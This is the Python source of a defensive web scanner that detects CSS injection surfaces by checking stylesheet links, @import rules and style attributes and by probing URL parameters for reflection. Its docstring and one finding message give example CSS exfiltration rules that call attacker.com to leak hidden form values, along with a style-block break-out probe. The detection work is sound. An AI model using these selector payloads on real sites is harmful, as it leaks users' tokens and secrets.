"""
CSS Injection Attack Surface Scanner.

CSS Injection occurs when user-controlled data is embedded in a CSS context
without proper escaping or sanitization. Despite being labelled a "low severity"
issue by some scanners, CSS injection has serious real-world impact:

1. **Data Exfiltration via Attribute Selectors** (the classic CSS exfil attack):
   input[value^="a"] { background: url(//attacker.com/a) }
   By iterating through characters, attackers can leak CSRF tokens, API keys,
   and other hidden form field values without JavaScript.

2. **Style Hijacking** (UI redressing, phishing):
   Inject CSS to make a malicious element overlay the real login form.

3. **Keylogging via CSS Selectors**:
   a[href*="password=x"] triggers when the URL contains password=x
   → can enumerate password characters via repeated probes.

4. **Inline Style Injection** (when user data lands in style= attribute):
   style="color: INJECTION" — can break out with } and define new rules.

Blue-team checks (passive, read-only):
1. Detect URL parameters that reflect into CSS `<style>` blocks
2. Detect `style=` attributes containing reflected user input
3. Detect `<link rel="stylesheet" href="...">` with user-controlled href
4. Detect CSS import at-rule with reflected values (@import)
5. Detect inline style in HTML meta/link tags with reflected params

References:
  PortSwigger: CSS Injection
  Cure53: CSS Exfil Vulnerability (Mike Gualtieri, 2018)
  HackerOne reports: #14883 (Twitter), #171975 (HackerOne itself)
  CWE-79 (variant: CSS context), OWASP A03: Injection
  https://portswigger.net/research/stealing-data-with-css-attack
"""

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote

from bs4 import BeautifulSoup

from tblue.scanner.base import BaseScanner
from tblue.logger import get_logger, log_pass, log_fail, log_warn

logger = get_logger(__name__)

# CSS injection probe strings — innocuous in HTML, detectable in CSS context
_CSS_PROBE_VALUE = "CSSINJPROBE7x9z"
_CSS_BREAK_PROBE = "}</style><style>body{background:red}"

# Patterns that indicate CSS context injection of the probe
_CSS_CONTEXT_RE = re.compile(
    r"(?:<style[^>]*>[^<]*" + re.escape(_CSS_PROBE_VALUE) + r"|"
    + re.escape(_CSS_PROBE_VALUE) + r"[^<]*(?:url\(|;|:|}|\{))",
    re.I | re.S,
)

# User-controlled stylesheet href
_STYLE_HREF_RE = re.compile(
    r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']([^"\']+)["\']',
    re.I,
)

# CSS @import in style block
_CSS_IMPORT_RE = re.compile(r"@import\s+(?:url\()?['\"]?([^'\")\s]+)", re.I)

# Reflected value in style attribute
_STYLE_ATTR_RE = re.compile(r'\bstyle\s*=\s*["\'][^"\']*', re.I)

# Inline style injection indicators
_STYLE_INJECTION_RE = re.compile(
    r'style\s*=\s*["\'][^"\']*(?:expression\s*\(|url\s*\(|import\s|javascript\s*:)',
    re.I,
)

# CSS custom property injection (CSS variable leak)
_CSS_VAR_RE = re.compile(r"var\(--[^)]+\)", re.I)


class CSSInjectionScanner(BaseScanner):
    """Detect CSS injection attack surfaces in web pages."""

    def scan(self, url: str) -> List[Dict[str, Any]]:
        self.results = []

        resp = self.http.get(url)
        if resp is None:
            self.results.append(self._result(
                url, "CSS injection — target unreachable", "PASS",
                detail="No response from target.",
            ))
            return self.results

        body = resp.text or ""
        parsed = urlparse(url)

        # 1. Check for user-controlled stylesheet import
        self._check_stylesheet_href(url, body)

        # 2. Check style attributes for potential injection
        self._check_style_attributes(url, body)

        # 3. Probe URL params that might reflect into CSS context
        if parsed.query:
            self._probe_url_params(url, parsed)

        if not self.results:
            log_pass(logger, f"CSS injection — no injection surface detected on {url}")
            self.results.append(self._result(
                url,
                "CSS injection — no CSS injection surface detected",
                "PASS",
                detail=(
                    "No user-controlled CSS injection vectors were detected. "
                    "This includes: stylesheet href with URL parameters, "
                    "style attribute injection, and URL params reflected into CSS context."
                ),
            ))

        return self.results

    def _check_stylesheet_href(self, url: str, body: str) -> None:
        """Check for stylesheet <link> tags with potentially user-controlled hrefs."""
        parsed_base = urlparse(url)
        query_params = set(parse_qs(parsed_base.query).keys())

        try:
            soup = BeautifulSoup(body, "html.parser")
            for link in soup.find_all("link", rel=lambda r: r and "stylesheet" in r):
                href = link.get("href", "")
                if not href:
                    continue
                # External stylesheet with user-controllable query params
                href_parsed = urlparse(href)
                if href_parsed.query:
                    href_params = set(parse_qs(href_parsed.query).keys())
                    overlap = href_params & query_params
                    if overlap:
                        log_warn(logger, f"CSS injection: stylesheet href with shared params: {href}")
                        self.results.append(self._result(
                            url,
                            f"CSS injection — stylesheet href contains URL parameter ({', '.join(overlap)})",
                            "WARN",
                            detail=(
                                f"A <link rel='stylesheet'> tag has an href containing URL parameters "
                                f"({', '.join(overlap)}) that are also in the page URL. "
                                "If these parameters are reflected without sanitization, an attacker "
                                "could control the stylesheet URL and inject arbitrary CSS. "
                                "Fix: never embed user-controlled input in stylesheet hrefs; "
                                "use CSP style-src with specific hashes or nonces."
                            ),
                        ))

            # Check for @import inside style blocks
            for style in soup.find_all("style"):
                css_text = style.get_text()
                for m in _CSS_IMPORT_RE.finditer(css_text):
                    import_url = m.group(1)
                    # If the import URL contains a query param that matches page params
                    if "?" in import_url:
                        import_parsed = urlparse(import_url)
                        import_params = set(parse_qs(import_parsed.query).keys())
                        overlap = import_params & query_params
                        if overlap:
                            log_warn(logger, f"CSS injection: @import with URL param in page URL")
                            self.results.append(self._result(
                                url,
                                "CSS injection — @import with user-controlled URL parameter",
                                "WARN",
                                detail=(
                                    "A CSS @import rule contains URL query parameters that "
                                    "overlap with current page parameters. If reflected without "
                                    "sanitization, attackers could redirect the CSS import to "
                                    "an attacker-controlled stylesheet. "
                                    "Fix: use Content-Security-Policy to restrict style-src."
                                ),
                            ))
        except Exception:
            pass

    def _check_style_attributes(self, url: str, body: str) -> None:
        """Check for style attribute patterns that indicate injection vectors."""
        if _STYLE_INJECTION_RE.search(body):
            log_fail(logger, f"CSS injection: dangerous CSS function found in style attribute on {url}")
            self.results.append(self._result(
                url,
                "CSS injection — dangerous CSS function in style attribute",
                "FAIL",
                detail=(
                    "A style attribute or block containing a potentially dangerous CSS construct "
                    "(expression(), url(), javascript: or @import) was detected in the page. "
                    "If any of these are derived from user input, CSS injection is confirmed. "
                    "Fix: never construct CSS from user input; sanitize with DOMPurify; "
                    "use a strict CSP style-src: 'nonce-<random>' to block injected styles."
                ),
            ))

    def _probe_url_params(self, url: str, parsed) -> None:
        """Probe URL params to see if they reflect into a CSS context."""
        params = parse_qs(parsed.query, keep_blank_values=True)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in params:
            # Build probe URL
            probe_params = dict(params)
            probe_params[param] = [_CSS_PROBE_VALUE]
            probe_url = base_url + "?" + urlencode(probe_params, doseq=True)

            r = self.http.get(probe_url)
            if r is None:
                continue

            body = r.text or ""
            if _CSS_PROBE_VALUE not in body:
                continue

            # Check if the reflection is inside a CSS context
            if _CSS_CONTEXT_RE.search(body):
                log_fail(logger, f"CSS injection: param '{param}' reflects into CSS context on {url}")
                self.results.append(self._result(
                    probe_url,
                    f"CSS injection — parameter '{param}' reflects into CSS context",
                    "FAIL",
                    method="GET",
                    fields=[param],
                    detail=(
                        f"URL parameter '{param}' is reflected inside a CSS <style> block "
                        "or CSS property value without proper escaping. An attacker can inject "
                        "arbitrary CSS rules, enabling:\n"
                        "• CSRF token / secret data exfiltration via attribute selectors "
                        "(background: url(//attacker.com/?c=VALUE))\n"
                        "• UI redressing and phishing overlays\n"
                        "• Keylogging via href attribute selectors\n"
                        "Fix: never reflect user input into CSS context; "
                        "if required, strictly allowlist values (e.g., color names or hex codes); "
                        "apply CSP style-src with nonces/hashes to block injected rules."
                    ),
                ))
                break  # one CSS injection is enough per URL
